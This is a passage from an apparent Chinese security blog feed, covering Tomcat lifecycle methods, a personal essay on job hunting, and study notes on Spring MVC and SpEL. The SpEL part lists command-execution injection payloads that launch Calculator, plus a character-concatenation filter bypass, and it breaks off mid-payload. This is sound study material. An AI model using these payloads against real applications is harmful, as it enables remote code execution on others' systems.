title="生命周期机制"></a>生命周期机制</h4><p>在调试过程中，我们可以发现，tomcat很规范地为几乎每个组件都实现了以下方法：</p><ul><li>init</li><li>start</li><li>stop</li><li>destory</li></ul><p>这些方法都定义在<code>Lifecycle</code>接口中，也就是存在于所谓的生命周期中。对于这些组件来说不变点就是每个组件的生命周期是一致的，即它们都要经历<code>创建</code>、<code>初始化</code>、<code>启动</code>、<code>停止</code>和<code>销毁</code>这几个过程，在这个过程中组件的状态和状态之间的转化也是不变的。而其中的变化点则是某个具体的组件在执行某个过程时是有所差异的。</p><p>reference:</p><ul><li><a href="https://xz.aliyun.com/t/11213">https://xz.aliyun.com/t/11213</a></li><li><a href="https://www.jianshu.com/p/7c9401b85704?utm_campaign=haruki&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation">https://www.jianshu.com/p/7c9401b85704?utm_campaign=haruki&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></li><li><a href="https://mp.weixin.qq.com/s/n3S0aUOsHvGLBebgUjYnIg">https://mp.weixin.qq.com/s/n3S0aUOsHvGLBebgUjYnIg</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 学习记录 </tag>
            
            <tag> java web </tag>
            
            <tag> tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春记·2022春招&amp;&amp;近期思考</title>
      <link href="/2022/04/29/spring-getjob/"/>
      <url>/2022/04/29/spring-getjob/</url>
      
        <content type="html"><![CDATA[<h1 id="春记·2022春招-amp-amp-近期思考"><a href="#春记·2022春招-amp-amp-近期思考" class="headerlink" title="春记·2022春招&amp;&amp;近期思考"></a>春记·2022春招&amp;&amp;近期思考</h1><p>很久没写这种杂记了。上一次写杂记还是在<del>上一次</del>初中？我感觉我初中班主任看完我写的这篇文章肯定想打我。没办法，现在笔都握不明白。写的文章都是技术文章，markdown几级标题快捷键一按就当文章分层，文字看起来都很硬核，几句话加上代码块和截图就能代表我最高的表达欲望。最多用一些软件画个思维导图，可能会让文章看起来显得很友好吧。（m1yuu的技术文章已经很好懂了，不信你去看fmyy的博客）</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个春天确实对于我来说很“精彩”。不只是我吧，整个小绿草战队大三的队员们几乎都选择了参加春招，寻找实习，尝试将自己的技术栈与各大互联网厂商需求进行对接。开始写这篇文章的日期是4月29日，金三银四已经算是彻底过去，回过头来看自己经历的十几次面试，拿到的一些offer，最终可能会作出的选择，心里其实有一种很奇怪的滋味。可能是走到了人生的一个岔路口，接下来要去某些互联网大厂或者安全实验室工作，不再是一名学生，没有自己自由的时间去做自己想做的事。可能不能专注于技术的学习，要看公司的需求，看资本家的脸色工作和学习。这一点从和很多面试官的交流中就能感受到，问的内容几乎都是公司在做的或者未来需要我去做的。从一名学生变成了互联网打工人，即使从事的是渗透测试，安全研究这种别人听起来很酷的白帽黑客工作，但也逃不掉随互联网的大流。</p><h2 id="一个人在夜里会思考的问题"><a href="#一个人在夜里会思考的问题" class="headerlink" title="一个人在夜里会思考的问题"></a>一个人在夜里会思考的问题</h2><h3 id="退役？"><a href="#退役？" class="headerlink" title="退役？"></a>退役？</h3><p>可能身边的人会听我提到已经从ctf退役去转实战之类的话题。这件事听起来很疑惑，很多知名的ctf选手甚至在工作之后还在战队里发光发热，国内几个顶级的ctf战队中的c位也是研究生或者大三大四的同学坐镇。相比之下，小绿草这两年的国赛队伍平均大二。小绿草2019届的队员们似乎说好了一样，大三渐渐淡出ctf，去做自己</p>]]></content>
      
      
      <categories>
          
          <category> 杂记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Spring基础</title>
      <link href="/2022/04/06/spring-base/"/>
      <url>/2022/04/06/spring-base/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring相关知识"><a href="#Spring相关知识" class="headerlink" title="Spring相关知识"></a>Spring相关知识</h1><p>这里记录一些Spring相关的知识，有框架特性或者漏洞复现，挖掘思路或者过程等等</p><h2 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring MVC"></a>Spring MVC</h2><p>Spring MVC中，所有的请求都有<code>DispatcherServlet</code>来统一处理、分发。然后借助<code>HandlerMapping</code>定位到处理请求的控制器(Controller)。</p><p><code>Controller</code>处理完成用户请求后，返回<code>ModelAndView</code>对象给<code>DispatcherServlet</code>。</p><p><img src="https://s2.loli.net/2022/04/06/FAlM2LEI1UkYCNw.png" alt="img"></p><h3 id="Spring-MVC实例"><a href="#Spring-MVC实例" class="headerlink" title="Spring MVC实例"></a>Spring MVC实例</h3><p>新建一个TestController</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/index"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token class-name">String</span> input<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"/WEB-INF/m1yuu/test.jsp"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现了一个控制器，在两层@RequestMapping的定义下，我们想要访问到test方法需要构造URL为/test/index</p><p>接着我们在/WEB-INF/m1yuu/下创建test.jsp：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">--</span>  <span class="token class-name">Created</span> by <span class="token class-name">IntelliJ</span> <span class="token class-name">IDEA<span class="token punctuation">.</span>  User</span><span class="token operator">:</span> m1saka  <span class="token class-name">Date</span><span class="token operator">:</span> <span class="token number">2022</span><span class="token operator">/</span><span class="token number">4</span><span class="token operator">/</span><span class="token number">4</span>  <span class="token class-name">Time</span><span class="token operator">:</span> <span class="token number">5</span><span class="token operator">:</span><span class="token number">58</span> 下午  <span class="token class-name">To</span> change <span class="token keyword">this</span> template use <span class="token class-name">File</span> <span class="token operator">|</span> <span class="token class-name">Settings</span> <span class="token operator">|</span> <span class="token class-name">File</span> <span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token operator">--</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">&gt;</span></span><span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">&gt;</span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">&gt;</span></span><span class="token class-name">Title</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span><span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">&gt;</span></span><span class="token class-name">File</span> in <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行tomcat，访问localhost:8080/你部署的位置/index/test可看到返回的是test.jsp的界面。</p><h3 id="Spring-MVC-Model向View传递值"><a href="#Spring-MVC-Model向View传递值" class="headerlink" title="Spring MVC Model向View传递值"></a>Spring MVC Model向View传递值</h3><p>model向view传递值，主要是通过<code>model.addAttribute</code>将值添加进去。修改TestController：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">m1yuu<span class="token punctuation">.</span>spring</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>ui<span class="token punctuation">.</span></span><span class="token class-name">Model</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/index"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token class-name">Model</span> model<span class="token punctuation">)</span><span class="token punctuation">{</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"/WEB-INF/m1yuu/test.jsp"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%--  Created by IntelliJ IDEA.  User: m1saka  Date: 2022/4/4  Time: 5:58 下午  To change this template use File | Settings | File Templates.--%&gt;&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;File in ...&lt;br&gt; my id is ${id}&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/04/06/Xfv2PawuKzcTU4l.png" alt="image-20220406162944627"></p><h3 id="Spring-MVC-获取URL参数值"><a href="#Spring-MVC-获取URL参数值" class="headerlink" title="Spring MVC 获取URL参数值"></a>Spring MVC 获取URL参数值</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">m1yuu<span class="token punctuation">.</span>spring</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>ui<span class="token punctuation">.</span></span><span class="token class-name">Model</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/index"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Model</span> model<span class="token punctuation">)</span><span class="token punctuation">{</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"/WEB-INF/m1yuu/test.jsp"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%--  Created by IntelliJ IDEA.  User: m1saka  Date: 2022/4/4  Time: 5:58 下午  To change this template use File | Settings | File Templates.--%&gt;&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;File in ...&lt;br&gt; my id is ${id}&lt;br&gt; my name is ${name}&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行后我们可以通过get或者post等传参方法传入参数name</p><p><img src="https://s2.loli.net/2022/04/06/tgEeRNTUVQiFMzA.png" alt="image-20220406163327236"></p><h2 id="SPEL"><a href="#SPEL" class="headerlink" title="SPEL"></a>SPEL</h2><h3 id="Spel-API"><a href="#Spel-API" class="headerlink" title="Spel API"></a>Spel API</h3><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20211129204221-cb68c010-5111-1.png"><img src="https://s2.loli.net/2022/04/06/msXDg1je8KJ7GaE.png" alt="img"></a></p><p><code>SpelExpressionParser</code>类负责解析表达式，返回一个<code>Expression</code>对象</p><p>getValue()<code>方法执行表达式，默认容器是spring本身的容器:</code>ApplicationContext</p><h3 id="Spel-Grammer"><a href="#Spel-Grammer" class="headerlink" title="Spel Grammer"></a>Spel Grammer</h3><h4 id=""><a href="#" class="headerlink" title="#{}"></a>#{}</h4><p>EL使用${},而Spel则是使用#{}作为定界符。所有在大括号内的内容都被认定为表达式。</p><p>示例:</p><ul><li>引用对象: #{person}</li><li>引用对象属性: #{person.name}</li><li>调用对象方法: #{person.toString()}</li></ul><h4 id="T"><a href="#T" class="headerlink" title="T()"></a>T()</h4><p>T()运算符会调用作用域的方法和常量。</p><p>例如: T(java.lang.Runtime),会返回一个java.lang.Runtime对象</p><h3 id="Spel定义"><a href="#Spel定义" class="headerlink" title="Spel定义"></a>Spel定义</h3><h4 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>bean id<span class="token operator">=</span><span class="token string">"Calc"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"org.spring.samples.Calc"</span><span class="token operator">&gt;</span>  <span class="token operator">&lt;</span>property name<span class="token operator">=</span><span class="token string">"Calc"</span> value<span class="token operator">=</span><span class="token string">"#{T(java.lang.Runtime).getRuntime().exec("</span><span class="token operator">/</span>system<span class="token operator">/</span><span class="token class-name">Applications</span><span class="token operator">/</span><span class="token class-name">Calculator</span><span class="token punctuation">.</span>app<span class="token operator">/</span><span class="token class-name">Contents</span><span class="token operator">/</span><span class="token class-name">MacOS</span><span class="token operator">/</span><span class="token class-name">Calculator</span>"<span class="token punctuation">)</span><span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>bean<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EmailSender</span> <span class="token punctuation">{</span>  <span class="token comment">// 这里比较特殊，如果获取属性名称，还可以使用${}</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"${spring.mail.personname}"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> personname<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span><span class="token string">"#{systemProperties['person.region'] }"</span><span class="token punctuation">)</span>        <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token class-name">Locale</span><span class="token punctuation">;</span>    <span class="token comment">//...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Spel用法"><a href="#Spel用法" class="headerlink" title="Spel用法"></a>Spel用法</h3><h4 id="Class-Expression"><a href="#Class-Expression" class="headerlink" title="Class Expression"></a>Class Expression</h4><p>new</p><p>可以通过new在Spel中实例化对象，类需要通过全限定名进行访问。</p><p>表达式内容:</p><pre class="line-numbers language-none"><code class="language-none">new java.lang.ProcessBuilder("/system/Applications/Calculator.app/Contents/MacOS/Calculator").start()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20211129204209-c48a53bc-5111-1.png"><img src="https://s2.loli.net/2022/04/06/zlfpATLut6Y2SRX.png" alt="img"></a></p><p>T()</p><p>表达式内容:</p><pre class="line-numbers language-none"><code class="language-none">T(java.lang.Runtime).getRuntime().exec("/system/Applications/Calculator.app/Contents/MacOS/Calculator")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20211129204151-b9a8613c-5111-1.png"><img src="https://s2.loli.net/2022/04/06/LGZ4vhx3nyTaNr5.png" alt="img"></a></p><h4 id="Bean-Reference"><a href="#Bean-Reference" class="headerlink" title="Bean Reference"></a>Bean Reference</h4><p>如果已经配置上下文，则可以通过@从表中查找JavaBean</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20211129204134-af8133a0-5111-1.png"><img src="https://s2.loli.net/2022/04/06/xf5pcWqwFMQaviZ.png" alt="img"></a></p><h4 id="Variable-Reference"><a href="#Variable-Reference" class="headerlink" title="Variable Reference"></a>Variable Reference</h4><p>通过<code>EvaluationContext#setVariable()</code>定义变量，可以在表达式中进行引用。</p><ul><li>引用变量: #variableName</li><li>引用根对象: #root</li><li>引用上下文对象: #this</li></ul><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20211129204118-a660f814-5111-1.png"><img src="https://s2.loli.net/2022/04/06/VixAOKFPy9aXRUq.png" alt="img"></a></p><p>如果把<code>context</code>的<code>root object</code>设置为一个对象时，在获取的时候可以省略root对象前缀</p><p>并且在执行表达式时，Spel会在内部使用反射从根对象中获取/设置属性值。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20211129204103-9d1057d2-5111-1.png"><img src="https://s2.loli.net/2022/04/06/cHjneYJD5lMpXAs.png" alt="img"></a></p><h4 id="User-defined-function"><a href="#User-defined-function" class="headerlink" title="User defined function"></a>User defined function</h4><p>用户可以在Spel中注册自定义方法，将该方法注册到<code>StandardEvaluationContext#registerFunction()</code>中</p><p>下面的<code>EncodeUtils#Encode2Base64</code>则是我自定义的方法</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20211129204046-92c55b10-5111-1.png"><img src="https://s2.loli.net/2022/04/06/ZJnxusdOWVQ9Pwy.png" alt="img"></a></p><h2 id="Spel注入payload"><a href="#Spel注入payload" class="headerlink" title="Spel注入payload"></a>Spel注入payload</h2><h3 id="三种payload"><a href="#三种payload" class="headerlink" title="三种payload"></a>三种payload</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token string">"/system/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//new    this.getClass().forName("java.lang.Runtime").getRuntime().exec("/system/Applications/Calculator.app/Contents/MacOS/Calculator")//反射    T(java.lang.Runtime).getRuntime().exec("open -a Calculator.app")//T()运算</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="一些绕过姿势："><a href="#一些绕过姿势：" class="headerlink" title="一些绕过姿势："></a>一些绕过姿势：</h3><h4 id="String类动态生成字符"><a href="#String类动态生成字符" class="headerlink" title="String类动态生成字符"></a>String类动态生成字符</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 